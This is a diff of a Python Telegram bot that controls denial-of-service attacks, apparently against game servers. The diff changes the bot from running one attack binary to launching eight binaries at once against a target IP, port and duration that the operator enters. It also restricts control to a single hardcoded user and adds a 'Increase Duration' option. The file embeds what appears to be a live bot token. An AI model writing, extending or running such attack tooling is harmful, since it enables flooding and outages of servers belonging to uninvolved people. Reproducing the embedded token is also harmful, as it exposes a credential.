@@ -1,17 +1,16 @@
 import telebot
 import logging
 import time
-from subprocess import Popen, PIPE
-from threading import Thread
+import os
+from subprocess import PIPE
 import asyncio
 from telebot.types import ReplyKeyboardMarkup, KeyboardButton
 
 # Initialize asyncio event loop
-loop = asyncio.new_event_loop()
-asyncio.set_event_loop(loop)
+loop = asyncio.get_event_loop()
 
 TOKEN = '7031476424:AAG6bW4N65VCpxyOgdjiWQ6FYbVnGal2uXY'
-CHANNEL_ID = -1002161930825
+USER_ID = 1165523648  # Replace with your actual user ID
 
 logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
 
@@ -20,72 +19,111 @@ REQUEST_INTERVAL = 1
 
 # Global variables to store attack details
 attack_details = {}
-attack_process = None
+attack_processes = []  # List to store multiple processes
+default_duration = None  # Global variable for default duration
 
 async def run_attack_command_async(target_ip, target_port, duration):
-    global attack_process
-    # Start the bgmi process
-    attack_process = await asyncio.create_subprocess_shell(
-        f"./FUCK {target_ip} {target_port} {duration}",
-        stdout=PIPE, stderr=PIPE
-    )
-    await attack_process.communicate()
+    global attack_processes
+    # List of files to execute
+    attack_files = ["./VC-VB", "./VC-V0", "./VC-V1", "./VC-V2", "./VC-V3", "./VC-V4", "./VC-V5.1", "./VC-V5.2"]
+
+    # Start multiple attack processes
+    attack_processes = [
+        await asyncio.create_subprocess_shell(
+            f"{file} {target_ip} {target_port} {duration} 100", stdout=PIPE, stderr=PIPE
+        ) for file in attack_files
+    ]
+    
+    # Wait for all processes to complete
+    await asyncio.gather(*(process.communicate() for process in attack_processes))
     
     # Notify that the attack has ended
-    bot.send_message(CHANNEL_ID, f"*Attack ended 🛑\n\nHost: {target_ip}\nPort: {target_port}\nTime: {duration}*", parse_mode='Markdown')
+    bot.send_message(USER_ID, f"*Attack ended 🛑\n\nHost: {target_ip}\nPort: {target_port}\nTime: {duration}*", parse_mode='Markdown')
 
 def stop_attack():
-    global attack_process
-    if attack_process:
-        attack_process.terminate()
-        attack_process.kill()
-        attack_process = None
+    global attack_processes
+    for process in attack_processes:
+        if process:
+            os.kill(process.pid, 9)  # Forcefully kill the process using SIGKILL
+    attack_processes = []  # Clear the process list after termination
 
 @bot.message_handler(commands=['start'])
 def send_welcome(message):
-    markup = ReplyKeyboardMarkup(row_width=2, resize_keyboard=True, one_time_keyboard=True)
-    btn1 = KeyboardButton("Record 📝")
-    btn2 = KeyboardButton("Start Attack 💥")
-    btn3 = KeyboardButton("Stop Attack ✋")
-    markup.add(btn1, btn2, btn3)
-    bot.send_message(message.chat.id, "*Choose an option:*", reply_markup=markup, parse_mode='Markdown')
+    if message.chat.type == 'private' and message.chat.id == USER_ID:
+        # Create the keyboard layout
+        markup = ReplyKeyboardMarkup(row_width=2, resize_keyboard=True, one_time_keyboard=True)
+        
+        # Wider buttons for Record and Increase Duration
+        btn1 = KeyboardButton("Record 📝")
+        btn4 = KeyboardButton("Increase Duration ⏱")
+        
+        # Side-by-side buttons for Start Attack and Stop Attack
+        btn2 = KeyboardButton("Start Attack 💥")
+        btn3 = KeyboardButton("Stop Attack ✋")
+        
+        # Add buttons to the markup
+        markup.add(btn1, btn4)
+        markup.add(btn2, btn3)
+        
+        bot.send_message(message.chat.id, "*Choose an option:*", reply_markup=markup, parse_mode='Markdown')
 
 @bot.message_handler(func=lambda message: True)
 def handle_message(message):
-    if message.text == "Record 📝":
-        bot.send_message(message.chat.id, "*Enter the target IP, port, and duration (in seconds) separated by spaces:*", parse_mode='Markdown')
-        bot.register_next_step_handler(message, record_attack_details)
+    global default_duration
+    if message.chat.type == 'private' and message.chat.id == USER_ID:
+        if message.text == "Record 📝":
+            bot.send_message(message.chat.id, "*Enter the target IP, port, and duration (in seconds) separated by spaces:*", parse_mode='Markdown')
+            bot.register_next_step_handler(message, record_attack_details)
 
-    elif message.text == "Start Attack 💥":
-        if 'ip' in attack_details and 'port' in attack_details and 'duration' in attack_details:
-            # Send immediate message before starting the attack
-            bot.send_message(message.chat.id, f"*Attack started 💥\n\nHost: {attack_details['ip']}\nPort: {attack_details['port']}\nTime: {attack_details['duration']}*", parse_mode='Markdown')
-            asyncio.run_coroutine_threadsafe(run_attack_command_async(attack_details['ip'], attack_details['port'], attack_details['duration']), loop)
-        else:
-            bot.send_message(message.chat.id, "*Please record attack details first using the 'Record 📝' button.*", parse_mode='Markdown')
+        elif message.text == "Start Attack 💥":
+            if 'ip' in attack_details and 'port' in attack_details and 'duration' in attack_details:
+                # Use the default duration if set
+                duration = default_duration or attack_details['duration']
+                # Send immediate message before starting the attack
+                bot.send_message(message.chat.id, f"*Attack started 💥\n\nHost: {attack_details['ip']}\nPort: {attack_details['port']}\nTime: {duration}*", parse_mode='Markdown')
+                asyncio.run_coroutine_threadsafe(run_attack_command_async(attack_details['ip'], attack_details['port'], duration), loop)
+            else:
+                bot.send_message(message.chat.id, "*Please record attack details first using the 'Record 📝' button.*", parse_mode='Markdown')
 
-    elif message.text == "Stop Attack ✋":
-        stop_attack()
-        bot.send_message(message.chat.id, "*Attack stopped successfully.*", parse_mode='Markdown')
+        elif message.text == "Stop Attack ✋":
+            stop_attack()
+            bot.send_message(message.chat.id, "*Attack stopped successfully.*", parse_mode='Markdown')
+
+        elif message.text == "Increase Duration ⏱":
+            bot.send_message(message.chat.id, "*Enter the new default duration (in seconds):*", parse_mode='Markdown')
+            bot.register_next_step_handler(message, set_default_duration)
 
 def record_attack_details(message):
+    global default_duration
     try:
-        args = message.text.split()
-        if len(args) != 3:
-            bot.send_message(message.chat.id, "*Invalid command format. Please use: target_ip target_port duration*", parse_mode='Markdown')
-            return
+        if message.chat.type == 'private' and message.chat.id == USER_ID:
+            args = message.text.split()
+            if len(args) != 3:
+                bot.send_message(message.chat.id, "*Invalid command format. Please use: target_ip target_port duration*", parse_mode='Markdown')
+                return
 
-        target_ip, target_port, duration = args[0], int(args[1]), args[2]
+            target_ip, target_port, duration = args[0], int(args[1]), args[2]
 
-        attack_details['ip'] = target_ip
-        attack_details['port'] = target_port
-        attack_details['duration'] = duration
+            attack_details['ip'] = target_ip
+            attack_details['port'] = target_port
+            attack_details['duration'] = duration
+            default_duration = duration  # Set default duration to the newly recorded duration
 
-        bot.send_message(message.chat.id, f"*Attack details recorded 💾\n\nHost: {target_ip}\nPort: {target_port}\nTime: {duration}*", parse_mode='Markdown')
+            bot.send_message(message.chat.id, f"*Attack details recorded 💾\n\nHost: {target_ip}\nPort: {target_port}\nTime: {duration}*", parse_mode='Markdown')
 
     except Exception as e:
         logging.error(f"Error in recording attack details: {e}")
         bot.send_message(message.chat.id, "*An error occurred while recording attack details. Please try again.*", parse_mode='Markdown')
+
+def set_default_duration(message):
+    global default_duration
+    try:
+        if message.chat.type == 'private' and message.chat.id == USER_ID:
+            new_duration = int(message.text)
+            default_duration = new_duration
+            bot.send_message(message.chat.id, f"*Default duration set to {new_duration} seconds.*", parse_mode='Markdown')
+    except ValueError:
+        bot.send_message(message.chat.id, "*Invalid duration. Please enter a valid number.*", parse_mode='Markdown')
 
 if __name__ == "__main__":
     # Start the asyncio event loop in a separate thread
